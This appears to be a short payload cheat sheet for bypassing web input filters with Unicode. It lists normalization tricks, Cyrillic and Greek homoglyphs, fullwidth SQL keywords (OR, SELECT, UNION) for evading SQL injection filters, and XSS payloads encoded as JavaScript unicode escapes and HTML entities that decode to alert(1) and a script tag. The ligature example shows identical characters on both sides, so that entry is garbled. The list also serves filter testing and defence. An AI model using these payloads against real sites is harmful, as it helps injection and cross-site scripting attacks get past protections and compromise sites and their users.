# ---- Unicode Normalization Bypass ----
# Uppercase ß → SS (German sharp S)
# ı → I (Turkish dotless i)
# fi → fi (ligature)
# These can bypass case-insensitive filters

# ---- Homoglyphs (visually similar characters) ----
а = Cyrillic 'a' (U+0430) vs Latin 'a' (U+0061)
е = Cyrillic 'e' (U+0435) vs Latin 'e' (U+0065)
о = Cyrillic 'o' (U+043E) vs Latin 'o' (U+006F)
ρ = Greek rho (U+03C1) vs Latin 'p' (U+0070)
ν = Greek nu (U+03BD) vs Latin 'v' (U+0076)

# ---- Unicode SQL Injection Bypass ----
# FULLWIDTH characters:
ＡＢＣＤＥＦ→ABCDEF (via normalization)
ＯＲ = OR
ＳＥＬＥＣＴ = SELECT
ＵＮＩＯＮspace = UNION

# ---- Unicode XSS Bypass ----
# JavaScript unicode escapes:
\u0061\u006c\u0065\u0072\u0074(1) = alert(1)
\u003cscript\u003ealert(1)\u003c/script\u003e = <script>alert(1)</script>
# HTML numeric references:
&#x61;&#x6c;&#x65;&#x72;&#x74;(1) = alert(1)
&#97;&#108;&#101;&#114;&#116;(1) = alert(1)
